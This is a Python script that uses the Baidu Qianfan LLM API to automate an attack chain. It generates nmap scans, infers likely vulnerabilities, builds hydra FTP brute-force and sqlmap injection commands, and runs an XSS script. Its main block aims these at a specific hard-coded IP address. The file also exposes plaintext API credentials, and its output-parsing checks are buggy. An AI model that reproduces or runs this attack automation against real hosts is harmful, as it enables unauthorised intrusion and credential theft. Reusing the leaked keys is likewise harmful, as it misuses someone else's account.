import requests
import json
import logging

#设置log
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')

#百度的api key
API_KEY = "adLhPcloliub9zaiPPw6MoNl"
SECRET_KEY = "szo3kryIODFcYXCtYBObFiLb7QauQ49N"


#获取token数量
def get_access_token():
    """
    使用 AK，SK 生成鉴权签名（Access Token）
    :return: access_token，或是None(如果错误)
    """
    url = "https://aip.baidubce.com/oauth/2.0/token"
    params = {"grant_type": "client_credentials", "client_id": API_KEY, "client_secret": SECRET_KEY}
    return str(requests.post(url, params=params).json().get("access_token"))


#传送数据
def baidu_qfan(prompt="你好！"):
    url = "https://aip.baidubce.com/rpc/2.0/ai_custom/v1/wenxinworkshop/chat/chatglm2_6b_32k?access_token=" + get_access_token()
    payload = json.dumps({
        "messages": [
            {
                "role": "user",
                "content": prompt
            }
        ]
    })
    headers = {
        'Content-Type': 'application/json'
    }
    response = requests.request("POST", url, headers=headers, data=payload)
    # 解析返回json
    response_data = json.loads(response.text)
    print(response_data)
    # 提取信息
    extracted_text = response_data['result']
    logging.info("获得结果")
    return extracted_text

def chat_with_baidu_qfan():
    input1 = ""
    output1 = ""
    prompt = f'''

'''
    return baidu_qfan(prompt)


#生成nmap指令
def chat_with_baidu_command(input2):
    prompt = f'''
指令: 生成一个nmap的控制指令
背景信息: 你是一个专业的网络安全工程师，现在需要你根据输入的补充数据生成nmap的控制指令
补充数据：{input2}
输出格式：
指令为:nmap {input2} -sS
'''
    #获得返回内容
    result = baidu_qfan(prompt)
    #提取内容
    result = result.split("指令为:")
    logging.info("获取指令完成")
    if len(result) >= 2 or len(result[1]) > 0:
        return result[1]
    else: 
        return "error"


def chat_with_baidu_nmap(inputdata):
    prompt = f'''
指令:分析输入的nmap探测内容
背景信息:你是一名专业的网络安全工程师，现在你已经用nmap完成端口扫描，你需要分析nmap输出的内容判断每个端口的状态
补充数据:{inputdata}
输出格式:输出nmap探测结果的分析，判断哪些端口是开启的，格式如下：
#
开启的端口有:
可能运行的服务为:
#
'''
    result = baidu_qfan(prompt)
    print(result)
    if result is not None:
        if "以下是根据提供的指令和补充数据" in result:
            return "error"
        else:
            result = result.split("开启的端口有:")
            print(result)
            if len(result) >= 2 or len(result[1]) > 0:
                result = result[1]
            else:
                return "error"
            result = result.split("可能运行的服务为:")
            with open("./settings/env.txt", 'a', encoding='utf-8') as file:
                file.write(result[1])
            logging.info(f"nmap处理完成")
            print(result[1])
            return(result[1])
    else:
        return baidu_qfan(prompt)


#生成nmap的解析指令
def chat_with_baidu_get_other_command(inputdata):
    prompt = f'''
指令:根据nmap的探测结果分析可能存在哪些类型的漏洞
背景信息:你是一个专业的网络安全工程师，你需要分析nmap的扫描结果判断可能存在哪些类型的漏洞
补充数据:{inputdata}
输出格式:可能存在:
XXX
XXX
'''
    result = baidu_qfan(prompt)
    print(result)
    if result is not None:
        result = result.split("漏洞类型：")
        print(result)
        if len(result) >= 2 or len(result[1]) > 0:
            result = result[1]
        else:
            return "error"
        result = result.split("请注意")
        with open("./settings/list.txt", 'a', encoding='utf-8') as file:
            file.write(result[0])
        logging.info(f"环境处理完成")
    else:
        return baidu_qfan(prompt)
    

#ftp攻击命令
def chat_with_baidu_ftp(ip, username, password_file):
    prompt = f'''
指令:生成hydra命令
背景信息:你是一个专业的网络工程师，生成一个hydra命令
补充数据:{ip}
{password_file}
{username}
输出格式:hydra -l {username} -P {password_file} ftp://{ip}
'''
    result = baidu_qfan(prompt)
    print(result)
    if result is not None:
        result = result.split("\n")
        print(result)
        # result = result[1]
        # result = result.split("这个命令")
        logging.info(f"环境处理完成")
        if len(result) >= 2 or len(result[0]) > 0:
            return result[0]
        else:
            return "error"
    else:
        return baidu_qfan(prompt)


#xss攻击命令
def chat_with_baidu_xss(ip, xss_path, python_path):
    prompt = f'''
指令:运行python脚本
背景信息:你是一个程序员，现在你需要运行一个python脚本，python路径为：{python_path}，脚本位置为：{xss_path}, 参数为：-u http://{ip}
补充数据:{ip} {xss_path} {python_path}
输出格式:```
{python_path} {xss_path} -u http://{ip}
```
'''
    result = baidu_qfan(prompt)
    print(result)
    if result is not None:
        result = result.split("```")
        print(result)
        if len(result) >= 2 or len(result[1]) > 0:
            result = result[1]
        else:
            return "error"
        result = result.split("```")
        logging.info(f"环境处理完成")
        print(result[0])
        return result[0]
    else:
        return baidu_qfan(prompt)


#sql注入命令
def chat_with_baidu_sql(ip):
    prompt = f'''
指令:生成sql注入命令
背景信息:你是一个专业的网络工程师，根据我的补充数据和输出格式，生成一个sql注入命令
补充数据:{ip}
输出格式:sqlmap -u "http://{ip}/post.php?id=1""
'''
    result = baidu_qfan(prompt)
    print(result)
    if result is not None:
        result = result.split("```")
        print(result)
        if len(result) >= 2 or len(result[1]) > 0:
            result = result[1]
        else:
            return "error"
        result = result.split("```")
        logging.info(f"环境处理完成")
        print(result[0])
        if len(result[0]) > 0:
            return result[0]
        else:
            return "error"
    else:
        return baidu_qfan(prompt)


if __name__ == '__main__':
    input1 = "158.190.150.161"
    input2 = f'''
Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-25 02:04 EDT
Nmap scan report for 192.168.200.136
Host is up (0.0013s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
888/tcp  open  accessbuilder
3306/tcp open  mysql
8888/tcp open  sun-answerbook
MAC Address: 00:0C:29:F7:25:C4 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 5.25 seconds

'''
    #chat_with_baidu_command(input1)
    #chat_with_baidu_nmap(input2)
    #chat_with_baidu_get_other_command('''- 21 (FTP)
#- 80 (HTTP)
#- 888 (AccessBuilder)
#- 3306 (MySQL)''')
    #chat_with_baidu_ftp("158.190.150.161", "hp", "./password.txt")
    chat_with_baidu_xss("158.190.150.161", "/mnt/xss.py", "/bin/python")
    #Schat_with_baidu_sql("158.190.150.161")
